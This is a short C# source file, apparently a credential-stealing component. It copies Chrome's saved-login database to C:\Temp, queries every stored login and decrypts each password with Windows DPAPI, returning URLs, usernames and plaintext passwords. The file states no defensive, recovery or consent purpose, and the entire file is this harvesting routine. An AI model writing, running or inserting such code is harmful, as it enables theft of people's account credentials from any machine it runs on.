using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SQLite;
using System.IO;
using System.Security.Cryptography;
using System.Text;


namespace ConsoleMane
{
    class ChromePass
    {
        public ChromePass(string url, string login, string password)
        {
            Url = url;
            Login = login;
            Password = password;
        }
        public string Url { get; set; }
        public string Login { get; set; }
        public string Password { get; set; }
    }
     class ChromeKit
    {
        public static List<ChromePass> GetChromiumPasswords(string filePass)
        {
            File.Copy(filePass, @"C:\Temp\Login Data", true);
            filePass = @"C:\Temp\Login Data";
            List<ChromePass> result = new List<ChromePass>();
            string connectionString = $"Data Source = {filePass}";
            string db_fields = "logins";
            byte[] entropy = null;
            string description;
            DataTable db = new DataTable();
            string sql = $"SELECT * FROM {db_fields}";
            using (SQLiteConnection connection = new SQLiteConnection(connectionString))
            {
                SQLiteCommand command = new SQLiteCommand(sql, connection);
                SQLiteDataAdapter adapter = new SQLiteDataAdapter(command);
                adapter.Fill(db);
            }

            int rows = db.Rows.Count;
            for (int i = 0; i < rows; i++)
            {
                string url = db.Rows[i][1].ToString();
                string login = db.Rows[i][3].ToString();
                byte[] byteArray = (byte[])db.Rows[i][5];
                byte[] decrypted = ProtectedData.Unprotect(byteArray, entropy, DataProtectionScope.LocalMachine);
                string password = Encoding.UTF8.GetString(decrypted);
                result.Add(new ChromePass(url, login, password));
            }
            return result;
        }
    }
}